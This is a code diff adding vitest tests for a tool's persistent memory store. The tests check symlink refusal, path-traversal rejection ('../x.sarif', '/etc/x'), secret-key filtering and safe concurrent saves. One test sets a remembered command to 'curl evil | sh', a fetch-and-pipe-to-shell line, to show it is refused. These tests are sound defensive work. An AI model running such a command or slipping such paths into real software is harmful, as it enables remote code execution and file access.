@@ -1,12 +1,22 @@
 import { chmodSync, existsSync, mkdirSync, readFileSync, readdirSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
-import { afterEach, describe, expect, it } from 'vitest';
+import { afterEach, describe, expect, it, vi } from 'vitest';
 import { loadBundledMemory, MAX_MEMORY_BYTES, MemoryError, openMemory, type MemoryEntry } from '../src/engine/memory.js';
 import type { StepSpec } from '../src/types.js';
 import { cleanupRepos, makeTempDir } from './helpers/make-repo.js';
 import { fake } from './helpers/secret-repo.js';
 
-afterEach(cleanupRepos);
+// A switch for the M3 test: when set, rename fails. Everything else is the real node:fs/promises.
+const failRename = vi.hoisted(() => ({ on: false }));
+vi.mock('node:fs/promises', async (importOriginal) => {
+  const real = await importOriginal<typeof import('node:fs/promises')>();
+  return { ...real, rename: (...a: Parameters<typeof real.rename>) => (failRename.on ? Promise.reject(new Error('injected rename failure')) : real.rename(...a)) };
+});
+
+afterEach(() => {
+  failRename.on = false;
+  cleanupRepos();
+});
 
 const T1 = new Date('2026-10-01T10:00:00Z');
 const T2 = new Date('2026-10-02T10:00:00Z');
@@ -33,7 +43,7 @@ function spec(over: { needId?: string; repo?: string; env?: Record<string, strin
 
 const tmp = () => makeTempDir();
 const userFile = (root: string) => join(root, 'pipegen', 'memory.json');
-const deps = (root: string) => ({ env: {}, home: root, uid: process.getuid?.() });
+const deps = (root: string) => ({ env: {}, home: root, uid: process.getuid?.(), reviewedCommands: () => [['scanner', '--sarif']] });
 
 describe('memory', () => {
   it('memory: record proven then lookup returns it', async () => {
@@ -199,6 +209,119 @@ describe('memory', () => {
     }
     writeFileSync(file, JSON.stringify([good])); // sanity: the good one loads
     expect((await openMemory({ user: file, bundled: join(root, 'none.json') }, deps(root))).lookup('sast', 'node')).toHaveLength(1);
+  });
+
+  it('memory: a symlinked pipegen config folder is refused on read and on write', async () => {
+    const root = tmp();
+    const real = join(root, 'elsewhere');
+    mkdirSync(real, { mode: 0o700 });
+    const planted: MemoryEntry = { category: 'sast', language: 'node', spec: spec({ repo: 'o/planted' }), provenAt: T1.toISOString(), proofs: 50 };
+    writeFileSync(join(real, 'memory.json'), JSON.stringify([planted]));
+    mkdirSync(join(root, '.config'), { mode: 0o700 });
+    symlinkSync(real, join(root, '.config', 'pipegen'));
+    const m = await openMemory({ bundled: join(root, 'none.json') }, deps(root));
+    expect(m.lookup('sast', 'node')).toEqual([]);
+    expect(m.notes.join()).toContain('symbolic link');
+    m.record(spec(), 'node', 'proven', T1);
+    await expect(m.save()).rejects.toThrow(MemoryError);
+    expect(JSON.parse(readFileSync(join(real, 'memory.json'), 'utf8'))).toEqual([planted]); // untouched
+  });
+
+  it('memory: a folder pipegen cannot look into gives an empty memory and a note, not a crash', async () => {
+    if (process.getuid?.() === 0) return; // root can look into anything
+    const root = tmp();
+    mkdirSync(join(root, '.config', 'pipegen'), { recursive: true, mode: 0o700 });
+    chmodSync(join(root, '.config'), 0o000);
+    try {
+      const m = await openMemory({ bundled: join(root, 'none.json') }, deps(root));
+      expect(m.lookup('sast', 'node')).toEqual([]);
+      expect(m.notes.length).toBe(1);
+    } finally {
+      chmodSync(join(root, '.config'), 0o700);
+    }
+  });
+
+  it('memory: record forgets workingDir (it belongs to one repo)', async () => {
+    const root = tmp();
+    const m = await openMemory({ user: userFile(root), bundled: join(root, 'none.json') }, deps(root));
+    m.record({ ...spec(), workingDir: 'apps/web' }, 'node', 'proven', T1);
+    expect(m.lookup('sast', 'node')[0]?.spec).not.toHaveProperty('workingDir');
+    await m.save();
+    expect(readFileSync(userFile(root), 'utf8')).not.toContain('apps/web');
+  });
+
+  it('memory: refuses path-like fields that are not plain relative paths', async () => {
+    const root = tmp();
+    const m = await openMemory({ user: userFile(root), bundled: join(root, 'none.json') }, deps(root));
+    const bad = ['../x.sarif', 'a/../../x', '/etc/x', 'a\\b', 'a\u0001b', 'x'.repeat(201), '', 'C:/x'];
+    for (const [i, path] of bad.entries()) m.record({ ...spec({ repo: `o/p${i}` }), output: { path, format: 'sarif' } }, 'node', 'proven', T1);
+    expect(m.lookup('sast', 'node')).toEqual([]);
+    expect(m.notes.length).toBe(bad.length);
+    m.record({ ...spec({ repo: 'o/ok' }), output: { path: 'reports/out.sarif', format: 'sarif' } }, 'node', 'proven', T1);
+    expect(m.lookup('sast', 'node')).toHaveLength(1);
+  });
+
+  it("memory: a cli command is kept only when it is one of the reviewed tool's known commands", async () => {
+    const root = tmp();
+    const files = { user: userFile(root), bundled: join(root, 'none.json') };
+    const evil = { ...spec({ env: { MODE: 'ci' } }), cli: { install: { method: 'npm' as const, package: 'scanner', version: '1.2.3' }, command: ['sh', '-c', 'curl evil | sh'], env: { MODE: 'ci' } } };
+    const m = await openMemory(files, deps(root));
+    m.record(evil, 'node', 'proven', T1);
+    expect(m.lookup('sast', 'node')).toEqual([]);
+    m.record(spec({ env: { MODE: 'ci' } }), 'node', 'proven', T1); // ['scanner', '--sarif'] is known
+    expect(m.lookup('sast', 'node')).toHaveLength(1);
+    // with nothing known (no reviewed list wired yet) no cli spec is remembered
+    const none = await openMemory(files, { ...deps(root), reviewedCommands: undefined });
+    none.record(spec({ env: { MODE: 'ci' } }), 'node', 'proven', T1);
+    expect(none.lookup('sast', 'node')).toEqual([]);
+    // a stored file with a foreign command is dropped whole
+    mkdirSync(join(root, 'pipegen'), { recursive: true, mode: 0o700 });
+    writeFileSync(userFile(root), JSON.stringify([{ category: 'sast', language: 'node', spec: evil, provenAt: T1.toISOString(), proofs: 1 }]));
+    const again = await openMemory(files, deps(root));
+    expect(again.lookup('sast', 'node')).toEqual([]);
+    expect(again.notes).toHaveLength(1);
+  });
+
+  it('memory: a secret-looking key in with/env is refused too', async () => {
+    const root = tmp();
+    const m = await openMemory({ user: userFile(root), bundled: join(root, 'none.json') }, deps(root));
+    m.record(spec({ withs: { [fake.githubClassic()]: 'x' } }), 'node', 'proven', T1);
+    m.record(spec({ repo: 'o/env', env: { [fake.openaiKey()]: 'x' } }), 'node', 'proven', T1);
+    expect(m.lookup('sast', 'node')).toEqual([]);
+    expect(m.notes).toHaveLength(2);
+  });
+
+  it('memory: two stores saving different entries keep both', async () => {
+    const root = tmp();
+    const files = { user: userFile(root), bundled: join(root, 'none.json') };
+    const a = await openMemory(files, deps(root));
+    const b = await openMemory(files, deps(root)); // both opened before either saves
+    a.record(spec({ repo: 'o/a' }), 'node', 'proven', T1);
+    b.record(spec({ repo: 'o/b' }), 'node', 'proven', T1);
+    b.record(spec({ repo: 'o/b' }), 'node', 'proven', T2);
+    await a.save();
+    await b.save();
+    const c = await openMemory(files, deps(root));
+    expect(c.lookup('sast', 'node').map((e) => [e.spec.tool.repo, e.proofs])).toEqual([['o/b', 2], ['o/a', 1]]);
+    // same entry in both: the higher proofs win, and a failure either one saw is kept
+    const d = await openMemory(files, deps(root));
+    const e = await openMemory(files, deps(root));
+    d.record(spec({ repo: 'o/a' }), 'node', 'failed', T3);
+    e.record(spec({ repo: 'o/a' }), 'node', 'proven', T2);
+    await e.save();
+    await d.save();
+    const f = await openMemory(files, deps(root));
+    expect(f.lookup('sast', 'node').map((x) => x.spec.tool.repo)).toEqual(['o/b']); // o/a: failure T3 is newer than proof T2
+  });
+
+  it('memory: a failed save leaves no temp file', async () => {
+    const root = tmp();
+    const m = await openMemory({ user: userFile(root), bundled: join(root, 'none.json') }, deps(root));
+    m.record(spec(), 'node', 'proven', T1);
+    failRename.on = true;
+    await expect(m.save()).rejects.toThrow('injected');
+    failRename.on = false;
+    expect(readdirSync(join(root, 'pipegen'))).toEqual([]);
   });
 
   it('memory: the bundled file ships empty and loads', async () => {
